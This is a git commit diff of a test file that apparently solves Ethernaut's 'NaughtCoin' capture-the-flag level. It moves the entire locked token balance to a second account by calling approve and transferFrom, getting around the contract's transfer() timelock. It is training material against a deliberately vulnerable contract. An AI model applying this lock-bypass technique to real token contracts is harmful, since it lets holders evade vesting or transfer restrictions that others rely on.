3fee422221beb0d1bf5d0e00fa6ca79f2a2336bb
skcrypto10 <skcrypto10@gmail.com>
2023-01-22 19:22:41 -0500

    completed challenge 15

--- contracts/test/solutions/n15-naughtcoin.test.js
+++ contracts/test/solutions/n15-naughtcoin.test.js
@@ -1,6 +1,5 @@
 const NaughtCoinFactory = artifacts.require('./levels/NaughtCoinFactory.sol')
 const NaughtCoin = artifacts.require('./levels/NaughtCoin.sol')
-const NaughtCoinAttacker = artifacts.require('./attacks/N15NaughtCoinAttacker.sol')
 const utils = require('../utils/TestUtils')
 const { expect } = require("chai")
 const chai = require("chai")
@@ -8,15 +7,19 @@ const { solidity } = require("ethereum-waffle")
 chai.use(solidity)
 
 
-describe("Challenge 15 - NaughtCoin", function () {
+describe.only("Challenge 15 - NaughtCoin", function () {
     let ethernaut
     let level
     let instance
     let attacker
+    let attackerAltAddress
+
+    const initialSupply = "1000000"
 
     async function createLevelInstance() {
-        const [_attacker] = await web3.eth.getAccounts()
+        const [_attacker, _alt] = await web3.eth.getAccounts()
         attacker = _attacker
+        attackerAltAddress = _alt
 
         ethernaut = await utils.getEthernautWithStatsProxy()
         level = await NaughtCoinFactory.new()
@@ -34,7 +37,13 @@ describe("Challenge 15 - NaughtCoin", function () {
     before(createLevelInstance)
 
     describe("Initial State", function () {
+        it("player has all coins", async function () {
+            const attackerBalance = await instance.balanceOf(attacker)
+            const attackerAltBalance = await instance.balanceOf(attackerAltAddress)
 
+            expect(web3.utils.fromWei(attackerBalance)).to.eq(initialSupply)
+            expect(web3.utils.fromWei(attackerAltBalance)).to.eq("0")
+        })
     })
 
     describe("Attack Execution", function () {
@@ -45,8 +54,20 @@ describe("Challenge 15 - NaughtCoin", function () {
             Since the modifier is restricting the transfer() usage, we will
             use approve together with transferFrom to pass this level.
         */
-        it("unlocks the coins", async function () {
-            const maliciousContract = await NaughtCoinAttacker.new(instance.address)
+        it("unlock the coins", async function () {
+            await instance.approve(attackerAltAddress, web3.utils.toWei(initialSupply))
+
+            await instance.transferFrom(
+                attacker,
+                attackerAltAddress,
+                web3.utils.toWei(initialSupply),
+                { from: attackerAltAddress })
+
+            const attackerBalance = await instance.balanceOf(attacker)
+            const attackerAltBalance = await instance.balanceOf(attackerAltAddress)
+
+            expect(web3.utils.fromWei(attackerBalance)).to.eq("0")
+            expect(web3.utils.fromWei(attackerAltBalance)).to.eq(initialSupply)
         })
     })
 
